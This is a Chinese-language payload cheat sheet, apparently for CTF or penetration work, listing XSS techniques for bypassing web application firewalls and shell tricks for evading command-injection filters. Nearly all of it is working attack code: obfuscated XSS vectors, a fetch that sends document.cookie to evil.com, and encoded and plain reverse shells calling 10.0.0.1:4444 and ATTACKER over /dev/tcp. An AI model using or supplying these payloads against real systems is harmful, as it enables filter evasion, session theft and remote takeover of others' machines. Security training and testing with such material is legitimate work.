## 阶段三：XSS WAF 绕过

### 3.1 标签绕过
```html
<!-- 非常见标签 -->
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<video src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- 大小写 -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

### 3.2 编码绕过
```html
<!-- HTML 实体 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Unicode 编码 -->
<script>\u0061lert(1)</script>

<!-- URL 编码（在 URL 参数中） -->
%3Cscript%3Ealert(1)%3C/script%3E
```

### 3.3 JavaScript 变体
```javascript
// 无括号调用
alert`1`
window['alert'](1)
self['ale'+'rt'](1)
Reflect.apply(alert, null, [1])
[].constructor.constructor('alert(1)')()

// 无 alert
confirm(1)
prompt(1)
console.log(document.cookie)
fetch('http://evil.com/?c='+document.cookie)
```

---

## 阶段四：命令注入绕过

### 4.1 空格绕过
```bash
cat${IFS}/flag
cat$IFS$9/flag
cat</flag
{cat,/flag}
cat%09/flag     # tab
X=$'\x20';cat${X}/flag
```

### 4.2 关键词绕过
```bash
# 引号拼接
c''at /fl''ag
c\at /fl\ag

# 变量拼接
a=c;b=at;$a$b /flag
echo Y2F0IC9mbGFn|base64 -d|bash

# 通配符
cat /f???
cat /f*
cat /fla[g]

# rev 反转
echo "galf/ tac" | rev | bash
```

### 4.3 反弹 Shell 绕过
```bash
# Base64 编码
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash

# Python 无 import
python3 -c "exec(__import__('base64').b64decode('PAYLOAD_B64'))"

# 无 bash 的反弹
exec 5<>/dev/tcp/ATTACKER/4444; cat <&5 | while read line; do $line 2>&1 >&5; done
```

---

